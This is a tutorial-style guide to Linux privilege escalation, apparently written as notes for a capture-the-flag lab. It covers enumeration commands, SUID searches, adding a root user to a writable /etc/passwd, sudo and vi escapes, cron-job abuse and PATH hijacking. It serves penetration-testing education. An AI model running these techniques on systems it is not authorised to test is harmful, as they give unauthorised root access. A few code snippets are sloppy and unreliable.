# Linux privilege escalation

Let's do it!

There are two main privilege escalation variants:

Horizontal privilege escalation: This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user, that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get super user access. [Travel sideways on the tree]

Vertical privilege escalation (privilege elevation): This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges. [Travel up on the tree]

## Enumeration

### Kernel version

```bash
uname -a
```

### Distribution

```bash
cat /etc/issue
```

### Environment variables

```bash
env
```

### Sudo version

```bash
sudo -V
```

### Sudo configuration

```bash
cat /etc/sudoers
```

### Sudo permissions

```bash
sudo -l
```

### Cron jobs

```bash
ls -la /etc/cron*
ls -la /etc/cron.d
ls -la /etc/cron.hourly
ls -la /etc/cron.daily
ls -la /etc/cron.weekly
ls -la /etc/cron.monthly
ls -la /etc/crontab
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### Services

```bash
ps aux
netstat -antup
```

### Installed software

```bash
dpkg -l
rpm -qa
```

### Running processes

```bash
ps aux
```

### Listening ports

```bash
netstat -antup
```

### File permissions

```bash
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/group
```

LinEnum is a great script that automates the enumeration process. You can find it [here]()

LinPEAS is another great script that automates the privilege escalation process. You can find it [here]()

## Exploitation

### Sudo

If you have sudo permissions, you can run commands as another user. This can be used to run commands as the super user.

```bash
sudo su
```

### Sudo abuse

If you have sudo permissions, you can abuse them to run commands as the super user.

```bash
sudo /bin/bash
```

Permission	On Files	On Directories
SUID Bit	User executes the file with permissions of the file owner	-
SGID Bit	User executes the file with the permission of the group owner.
File created in directory gets the same group owner.
Sticky Bit	No meaning	Users are prevented from deleting files from other users.


Finding and Exploiting SUID Files

The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

What is an SUID binary?

As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions. Take a look at the following demonstration of how maximum privileges (rwx-rwx-rwx) look:

r = read

w = write

x = execute

    user     group     others

    rwx       rwx       rwx

    421       421       421

The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using "chmod" as 755, then it will be: rwxr-xr-x.


But when special permission is given to each user it becomes SUID or SGID. When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID) and when bit “2” is set to group it becomes SGID (Set Group ID).

Therefore, the permissions to look for when looking for SUID is:

SUID:

rws-rwx-rwx

GUID:

rwx-rws-rwx

Finding SUID Binaries

We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: "find / -perm -u=s -type f 2>/dev/null" to search the file system for SUID/GUID files. Let's break down this command.

find - Initiates the "find" command

/ - Searches the whole file system

-perm - searches for files with specific permissions

-u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form

-type f - Only search for files

2>/dev/null - Suppresses errors


# Find SUID files

```bash
find / -perm -u=s -type f 2>/dev/null
```

# Find SGID files

```bash
find / -perm -g=s -type f 2>/dev/null
```

# Find SUID files owned by root

```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

# Find SGID files owned by root

```bash
find / -user root -perm -2000 -exec ls -ldb {} \;
```

# Find files with POSIX capabilities

```bash
getcap -r / 2>/dev/null
```

# Find files with POSIX capabilities and display the capabilities

```bash
getcap -r / 2>/dev/null | awk '{if(length($0)>0)print $0; system("getcap " $1)}'
```

# Find files without owner

```bash
find / -nouser -exec ls -ldb {} \;
```

# Find files without group

```bash
find / -nogroup -exec ls -ldb {} \;
```

# Find sticky bit files

```bash
find / -perm -1000 -type d 2>/dev/null
```

# Find world-writable files

```bash
find / -perm -2 -type f 2>/dev/null
```

# Find world-writable directories

```bash
find / -perm -2 -type d 2>/dev/null
```

# Find files with no permission

```bash
find / -type f -not -perm /6000 2>/dev/null
```

# Find directories with no permission

```bash
find / -type d -not -perm /6000 2>/dev/null
```

# Find files with extended ACLs

```bash
getfacl -R / 2>/dev/null
```

# Find files that are not owned by root but are SUID

```bash
find / -type f -user !root -perm /4000 2>/dev/null
```

# Find files that are not owned by root but are SGID

```bash
find / -type f -user !root -perm /2000 2>/dev/null
```

# Find files that are not owned by root but have POSIX capabilities

```bash
getcap -r / 2>/dev/null | awk '{if(length($0)>0)print $0; system("getcap " $1)}' | grep -v 'root'
```

# Find files that are not owned by root but have POSIX capabilities and display the capabilities

```bash
getcap -r / 2>/dev/null | awk '{if(length($0)>0)print $0; system("getcap " $1)}' | grep -v 'root'
```

# Find files that are not owned by root but are world-writable

```bash
find / -type f -user !root -perm /002 2>/dev/null
```

# Find files that are not owned by root but are world-writable and display the permissions

```bash
find / -type f -user !root -perm /002 2>/dev/null -exec ls -ldb {} \;
```

# Find files that are not owned by root but are world-writable and display the permissions

```bash
find / -type f -user !root -perm /002 2>/dev/null -exec ls -ldb {} \;
```

Exploiting a writable /etc/passwd

Continuing with the enumeration of users, we found that user7 is a member of the root group with gid 0. And we already know from the LinEnum scan that /etc/passwd file is writable for the user. So from this observation, we concluded that user7 can edit the /etc/passwd file.

Understanding /etc/passwd

The /etc/passwd file stores essential information, which  is required during login. In other words, it stores user account information. The /etc/passwd is a plain text file. It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.

The /etc/passwd file should have general read permission as many command utilities use it to map user IDs to user names. However, write access to the /etc/passwd must only limit for the superuser/root account. When it doesn't, or a user has erroneously been added to a write-allowed group. We have a vulnerability that can allow the creation of a root user that we can access.

Understanding /etc/passwd format

The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows:

    test:x:0:0:root:/root:/bin/bash

[as divided by colon (:)]

Username: It is used when user logs in. It should be between 1 and 32 characters in length.
Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
Group ID (GID): The primary group ID (stored in /etc/group file)
User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
How to exploit a writable /etc/passwd

It's simple really, if we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!

# Add a new user to /etc/passwd

```bash
echo 'newuser:x:0:0:root:/root:/bin/bash' >> /etc/passwd
```

# Add a new user to /etc/passwd with password

```bash
openssl passwd -1 -salt hacker newpassword
echo 'newuser:$1$hacker$JZ6ZjJQJf6eLJ9zvzZvZz1' >> /etc/passwd
```

# Add a new user to /etc/passwd with password, group, home directory and shell

```bash
openssl passwd -1 -salt hacker newpassword
echo 'newuser:$1$hacker$JZ6ZjJQJf6eLJ9zvzZvZz1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Sudo -l
This exploit comes down to how effective our user account enumeration has been. Every time you have access to an account during a CTF scenario, you should use "sudo -l" to list what commands you're able to use as a super user on that account. Sometimes, like this, you'll find that you're able to run certain commands as a root user without the root password. This can enable you to escalate privileges.

Escaping Vi

Running this command on the "user8" account shows us that this user can run vi with root privileges. This will allow us to escape vim in order to escalate privileges and get a shell as the root user!

Misconfigured Binaries and GTFOBins

If you find a misconfigured binary during your enumeration, or when you check what binaries a user account you have access to can access, a good place to look up how to exploit them is GTFOBins. GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a really useful breakdown of how to exploit a misconfigured binary and is the first place you should look if you find one on a CTF or Pentest.

https://gtfobins.github.io/

What is Cron?

The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.

How to view what Cronjobs are active.

We can use the command "cat /etc/crontab" to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn't find anything.

Format of a Cronjob

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,

#  m   h dom mon dow user  command

17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly


How can we exploit this?

We know from our LinEnum scan, that the file autoscript.sh, on user4's Desktop is scheduled to run every five minutes. It is owned by root, meaning that it will run with root privileges, despite the fact that we can write to this file. The task then is to create a command that will return a shell and paste it in this file. When the file runs again in five minutes the shell will be running as root.

What is PATH?

PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.

It is very simple to view the Path of the relevant user with help of the command "echo $PATH".

How does this let us escalate privileges?

Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!


Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:

echo "[whatever command we want to run]" > [name of the executable we're imitating]

What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating

echo "/bin/bash" > ls
chmod +x ls | chmod 4777 ls | chmod 777 ls

Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "ls" stored! We do this using the command "export PATH=/tmp:$PATH"

Note, this will cause you to open a bash prompt every time you use "ls". If you need to use "ls" before you finish the exploit, use "/bin/ls" where the real "ls" executable is.

Once you've finished the exploit, you can exit out of root and use "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH" to reset the PATH variable back to default, letting you use "ls" again!
